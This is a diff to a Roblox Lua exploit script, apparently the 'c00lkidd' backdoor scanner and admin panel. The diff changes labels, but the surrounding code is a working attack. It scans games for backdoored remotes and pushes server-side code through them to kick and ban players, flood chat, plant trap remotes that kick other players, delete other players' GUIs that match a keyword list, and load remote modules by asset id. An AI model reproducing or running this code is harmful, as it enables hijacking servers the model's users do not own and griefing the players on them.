@@ -761,7 +761,7 @@ Converted["_UIStroke11"].Thickness = 1.5
 Converted["_UIStroke11"].Parent = Converted["_Sledge"]
 
 Converted["_Star"].Font = Enum.Font.Cartoon
-Converted["_Star"].Text = "k00pGui v4"
+Converted["_Star"].Text = "k00pskidd"
 Converted["_Star"].TextColor3 = Color3.fromRGB(255, 0, 0)
 Converted["_Star"].TextScaled = true
 Converted["_Star"].TextSize = 14
@@ -2392,7 +2392,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 	if foundExploit then return false end
 	if not isLikelyBackdoorRemote(remote) then return false end
 
-	local modelName = "ExecutingTCJT_" .. tostring(os.clock()):gsub("%.", "")
+	local modelName = "TCJT_" .. tostring(os.clock()):gsub("%.", "")
 	local rs = game:GetService("ReplicatedStorage")
 	local foundEvent = false
 	local testFlagName = "__backdoor_test_flag_" .. tostring(os.clock()):gsub("%.", "")
@@ -2667,7 +2667,7 @@ CommandsMenu:Button("Kick Player", function()
 		fireRemoteEvent('for i,v in pairs(game.Players:GetPlayers()) do if v.Name == "' .. selectedPlayer.Name .. '" then v:Kick("You have been kicked by c00lkidd admin panel") end end')
 	end
 end)
-CommandsMenu:Button("BanAsync Player", function()
+CommandsMenu:Button("Perm BanAsync Player", function()
 	if selectedPlayer and selectedPlayer ~= game.Players.LocalPlayer then
 		fireRemoteEvent([[
 			local Players = game:GetService("Players")
@@ -2724,7 +2724,7 @@ CommandsMenu:Button("Chat Player", function()
 			if targetPlayer then
 				coroutine.wrap(function()
 					for i = 1, 20 do
-						floodChat("c00lkidd.exe owns me", 1)
+						floodChat("c00lkidd owns me", 1)
 					end
 				end)()
 			end
@@ -2848,17 +2848,19 @@ end)
 	             remote.AncestryChanged:Connect(function(_, parent)
 		        if not parent then
 			  notify.Error("c00lkidd", "Remote Deleted!")
+			  script.Parent.Framee.Check.Visible = true
+			  script.Parent.Framee.Log.Visible = false
 		        end
 	              end)
                        else
-	                   logLabel.Text = "[???]"
+	                   logLabel.Text = "[Unidentified]"
 			end
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(159, 226, 191)
-			notify.Info("Backdoor Found!","Scan time : " .. scanTime)
+			notify.Info("Backdoor Found!","Scan time : " .. scanTime .. "s")
                         -----------
 			fireRemoteEvent('for _,v in pairs(game.JointsService:GetDescendants()) do if v:FindFirstChild("_FEBYPASS32") then v:Destroy() end end')
 			wait(0.5)
-			fireRemoteEvent('local Players=game:GetService("Players")local suspiciousKeywords={"hd admin","ranker","java1","darklord","pracharatbampen","sugma","ro xploit","secret service panel","kid","666","k1d","kidd","k1dd","k00p","l**pzworld","tubers","h01pk","ban","ban gui","itsnotskeleton","l0ck","bnkksd hd","andres","xxandresxx","c00lgui","c00l","elmarz","teamf*t","5x5x5x5","g00b","kick","ban","undetectable gui","undetectable","acron","russia","infector","potato","sans_gboard","l*ckgui","starp4tch","user1337","menotgonnadobadstuff","8t010t8","darius","j00p","144anz","sigma","noot","1x1x1x1","lacking923","kaax","s1n","k_aax","ep1c","zazol","lalol","cxyz","saudi","j01tar0","koma","gigxxx","hax0rz","g00l","enstrio","br1cked","hax"}local whitelist={[' .. game.Players.LocalPlayer.Name .. ']=true,["raizarit"]=true,["greguiscool"]=true,["raizarit6"]=true}local function isSuspicious(str)if not str then return false end str=str:lower()for _,k in ipairs(suspiciousKeywords)do if str:find(k)then return true end end return false end local function getOwningPlayer(i)local p=i while p and not p:IsA("PlayerGui")do p=p.Parent end if p and p:IsA("PlayerGui")then local character=p.Parent return Players:GetPlayerFromCharacter(character)or Players:FindFirstChild(character.Name)end return nil end local function deleteIfSuspicious(i)if i:IsA("TextLabel")or i:IsA("Frame")then local nameStr=i.Name local textStr=i:IsA("TextLabel")and i.Text or"" local pl=getOwningPlayer(i)if pl and whitelist[pl.Name]then return end if isSuspicious(nameStr)or isSuspicious(textStr)then local hint=Instance.new("Hint",workspace)hint.Text="[Skid] Deleted suspicious GUI: "..nameStr..(pl and" (user: "..pl.DisplayName..")"or" (Unknown)") task.delay(3,function()if hint and hint.Parent then hint:Destroy()end end) local f=i while f and not f:IsA("Frame")do f=f.Parent end if f then f:Destroy() else i:Destroy() end end end end for _,obj in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,obj)end game.DescendantAdded:Connect(function(obj) pcall(deleteIfSuspicious,obj) end)task.spawn(function() while true do for _,obj in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,obj)end task.wait(5)end end)')
+			fireRemoteEvent('local Players=game:GetService("Players")local suspiciousKeywords={"hd admin","ranker","java1","darklord","pracharatbampen","sugma","ro xploit","secret service panel","kid","666","k1d","kidd","k1dd","k00p","l**pzworld","tubers","h01pk","ban","ban gui","itsnotskeleton","l0ck","bnkksd hd","andres","xxandresxx","c00lgui","c00l","elmarz","teamf*t","5x5x5x5","g00b","kick","ban","undetectable gui","undetectable","acron","russia","infector","potato","sans_gboard","l*ckgui","starp4tch","user1337","menotgonnadobadstuff","8t010t8","darius","j00p","144anz","sigma","noot","1x1x1x1","lacking923","kaax","s1n","k_aax","ep1c","zazol","lalol","cxyz","saudi","j01tar0","koma","gigxxx","hax0rz","g00l","enstrio","br1cked","hax","zazol","acorn"}local whitelist={[' .. game.Players.LocalPlayer.Name .. ']=true,["raizarit"]=true,["greguiscool"]=true,["raizarit6"]=true}local function isSuspicious(str)if not str then return false end str=str:lower()for _,k in ipairs(suspiciousKeywords)do if str:find(k)then return true end end return false end local function getOwningPlayer(i)local p=i while p and not p:IsA("PlayerGui")do p=p.Parent end if p and p:IsA("PlayerGui")then local character=p.Parent return Players:GetPlayerFromCharacter(character)or Players:FindFirstChild(character.Name)end return nil end local function deleteIfSuspicious(i)if i:IsA("TextLabel")or i:IsA("Frame")then local nameStr=i.Name local textStr=i:IsA("TextLabel")and i.Text or"" local pl=getOwningPlayer(i)if pl and whitelist[pl.Name]then return end if isSuspicious(nameStr)or isSuspicious(textStr)then local hint=Instance.new("Hint",workspace)hint.Text="[Skid] Deleted suspicious GUI: "..nameStr..(pl and" (user: "..pl.DisplayName..")"or" (Unknown)") task.delay(3,function()if hint and hint.Parent then hint:Destroy()end end) local f=i while f and not f:IsA("Frame")do f=f.Parent end if f then f:Destroy() else i:Destroy() end end end end for _,obj in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,obj)end game.DescendantAdded:Connect(function(obj) pcall(deleteIfSuspicious,obj) end)task.spawn(function() while true do for _,obj in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,obj)end task.wait(5)end end)')
                         fireRemoteEvent('require(6735691273).BetaAntiSkid()')
 			fireRemoteEvent('local r=Instance.new("RemoteEvent",game.JointsService)r.Name="_FEBYPASS32"r.OnServerEvent:Connect(function(p)p:Kick("Use c00lkidd ss you skid bozo!")end)')
 		        fireRemoteEvent('require(7458325257).antiban()')
@@ -2868,7 +2870,7 @@ end)
 			fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.Workspace;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
 			fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.Lighting;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
 			fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.Players;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
-			fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.JointsService;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
+			fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.SoundService;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
             local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local localPlayer = Players.LocalPlayer
